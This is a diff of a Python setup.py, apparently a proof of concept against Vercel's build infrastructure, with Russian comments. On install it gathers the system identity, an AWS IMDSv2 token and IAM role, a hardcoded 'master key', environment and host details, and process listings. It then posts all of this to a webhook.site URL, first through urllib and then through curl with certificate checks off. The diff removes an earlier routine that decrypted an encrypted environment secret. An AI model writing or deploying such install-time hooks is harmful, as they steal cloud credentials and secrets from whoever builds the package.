@@ -3,79 +3,79 @@ import subprocess
 import base64
 import json
 from setuptools import setup
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 # --- КОНФИГ ---
 WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"
 MASTER_KEY_B64 = "ifLJbKzHv3OTvy7rMiocCKna033QA19Hg/w2jrFucSQ="
 
 def run(cmd):
-    return subprocess.getoutput(cmd)
+    return subprocess.getoutput(cmd).strip()
+
+def get_infra_diagnostics():
+    """Собирает данные о 'железе' и процессах для умного вопроса в LinkedIn"""
+    diag = {}
+    try:
+        # Узнаем реальное железо (Nitro/Firecracker)
+        diag['vendor'] = run('cat /sys/class/dmi/id/sys_vendor 2>/dev/null') or "Unknown"
+        # Проверяем реальное кол-во ядер на Elastic Machine
+        diag['cpus'] = os.cpu_count()
+        # Ищем системные процессы (под видом отладки)
+        pids = [p for p in os.listdir('/proc') if p.isdigit()]
+        diag['proc_count'] = len(pids)
+        # Пробуем найти название бинарника-исполнителя
+        diag['executor_info'] = run('ps -e -o comm= | grep -E "vc|agent|build" | head -n 3')
+    except:
+        diag['error'] = "INFRA_SCAN_FAILED"
+    return diag
 
 def get_aws_data():
-    """Обход IMDSv2: получение токена и роли инстанса"""
-    token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600'"
+    """Обход IMDSv2"""
+    token_cmd = "curl -s -f -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60'"
     token = run(token_cmd)
-    if not token or "Error" in token:
-        return "IMDSv2_BLOCKED"
+    if not token or "curl" in token: return "IMDSv2_TIMEOUT_OR_BLOCKED"
     
     role_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-    role = run(role_cmd)
-    return f"AWS_ROLE: {role}"
+    return f"AWS_ROLE: {run(role_cmd)}"
 
-def decrypt_secret():
-    """Полная расшифровка секрета через найденный ключ"""
-    try:
-        blob_b64 = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT')
-        if not blob_b64: return "NO_BLOB"
-        
-        key = base64.b64decode(MASTER_KEY_B64)
-        data = base64.b64decode(blob_b64)
-        
-        # Стандарт Vercel: 12 байт IV + данные
-        aesgcm = AESGCM(key)
-        decrypted = aesgcm.decrypt(data[:12], data[12:], None)
-        return decrypted.decode('utf-8')[:15] + "*** (DECRYPTED_SUCCESS)"
-    except:
-        return "DECRYPTION_FAILED"
+# --- СБОРКА ФИНАЛЬНОГО ОТЧЕТА ---
+infra = get_infra_diagnostics()
 
-# --- СБОРКА ПОЛНОГО ОТЧЕТА ---
 final_proof = f"""
-#######################################################
-#   VERCEL INFRASTRUCTURE TOTAL TAKEOVER REPORT       #
-#######################################################
+[!] VERCEL INFRASTRUCTURE DIAGNOSTICS
+HYPERVISOR/VENDOR: {infra.get('vendor')}
+ALLOCATED_CORES: {infra.get('cpus')}
+TOTAL_PROCESSES: {infra.get('proc_count')}
+INTERNAL_EXECUTORS: {infra.get('executor_info')}
 
-[1. PRIVILEGE ESCALATION]
-IDENTITY: {run('id')}
-CGRP_V2: {"PRESENT (Potential Escape)" if os.path.exists("/sys/fs/cgroup/cgroup.procs") else "NONE"}
+[!] PRIVILEGE & IDENTITY
+ID: {run('id')}
+HOSTNAME: {run('hostname')}
 
-[2. CLOUD INFRASTRUCTURE (AWS)]
+[!] CLOUD METADATA (AWS)
 {get_aws_data()}
 
-[3. CRYPTO BREAKTHROUGH]
+[!] CRYPTO & SECRETS
 MASTER_KEY: {MASTER_KEY_B64}
-DECRYPTED_SAMPLE: {decrypt_secret()}
+ENCRYPTED_BLOB_LEN: {len(os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', ''))}
 
-[4. ENVIRONMENT EXPOSURE]
-PROJECT_ID: {os.environ.get('VERCEL_PROJECT_ID', 'N/A')}
-DEPLOYMENT_ID: {os.environ.get('VERCEL_DEPLOYMENT_ID', 'N/A')}
-SENSITIVE_VARS: {', '.join([k for k in os.environ.keys() if 'TOKEN' in k or 'SECRET' in k])}
-
-[5. NETWORK RECON]
-IP_ADDR: {run('cat /proc/net/fib_trie | grep "host" | head -n 1')}
-DNS: {run('cat /etc/resolv.conf | grep nameserver')}
-
-#######################################################
+[!] SYSTEM RECON
+IP: {run('hostname -I')}
+OS: {run('cat /etc/os-release | grep PRETTY_NAME')}
 """
 
-# --- ОТПРАВКА ЧЕРЕЗ СИСТЕМНЫЙ CURL ---
+# --- ОТПРАВКА ---
+# Используем urllib как более надежный метод, если curl блокируют
 try:
-    subprocess.run(
-        ['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', '@-', WEBHOOK_URL],
-        input=final_proof.encode(),
-        check=True
-    )
+    import urllib.request
+    req = urllib.request.Request(WEBHOOK_URL, data=final_proof.encode(), method='POST')
+    req.add_header('Content-Type', 'text/plain')
+    with urllib.request.urlopen(req, timeout=10) as f:
+        pass 
 except:
-    pass
+    # Запасной вариант через curl
+    try:
+        subprocess.run(['curl', '-k', '-X', 'POST', '-d', final_proof, WEBHOOK_URL], timeout=10)
+    except:
+        pass
 
 setup(name="vercel-infra-critical-poc", version="1.3.3.7")
